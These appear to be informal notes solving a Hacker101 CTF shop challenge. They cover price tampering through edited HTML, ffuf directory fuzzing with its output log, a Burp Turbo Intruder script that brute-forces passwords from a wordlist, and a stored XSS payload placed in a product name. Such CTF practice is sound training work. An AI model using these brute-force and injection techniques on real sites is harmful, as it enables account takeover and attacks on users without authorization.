flags:

1. edit html to enable input on chart page. set prices to 0 and will find a flag
2. Use commons word list and web fuzzed tool - fuzz to find the list of available http paths = 
word lists => https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt


logs
```
heisenberg@heisenberg-inspiron5559:~/Downloads$ ffuf -u https://dadc20630b10d7047573968258c36334.ctf.hacker101.com/FUZZ -w common.txt -t 250 -c -v


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://dadc20630b10d7047573968258c36334.ctf.hacker101.com/FUZZ
 :: Wordlist         : FUZZ: common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 250
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

[Status: 200, Size: 410, Words: 15, Lines: 22]                                                                             
| URL | https://dadc20630b10d7047573968258c36334.ctf.hacker101.com/cart
    * FUZZ: cart

[Status: 200, Size: 329, Words: 16, Lines: 15]                                                                             
| URL | https://dadc20630b10d7047573968258c36334.ctf.hacker101.com/login
    * FUZZ: login

[Status: 301, Size: 169, Words: 5, Lines: 8]                                                                               
| URL | https://dadc20630b10d7047573968258c36334.ctf.hacker101.com/static
| --> | http://dadc20630b10d7047573968258c36334.ctf.hacker101.com/static/
    * FUZZ: static

:: Progress: [4723/4723] :: Job [1/1] :: 248 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
heisenberg@heisenberg-inspiron5559:~/Downloads$ 

```

## Use Burp suite extension turbo introduer to submit multiple http request to brute force user name and password
sample code
```python
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=500,
                           pipeline=False
                           )

    #for i in range(3, 8):
    #    engine.queue(target.req, randstr(i), learn=1)
    #    engine.queue(target.req, target.baseInput, learn=2)

    for word in open('/home/heisenberg/Downloads/10k-most-common.txt'):
        engine.queue(target.req, word.rstrip())


def handleResponse(req, interesting):
    if 'Invalid password' not in req.response:
        table.add(req)

```

3. JS injection attack by Edit the product. 
use `<script>alert("name")</script>` as the product name / description. save and then checkout the product to reveal the flag.

`
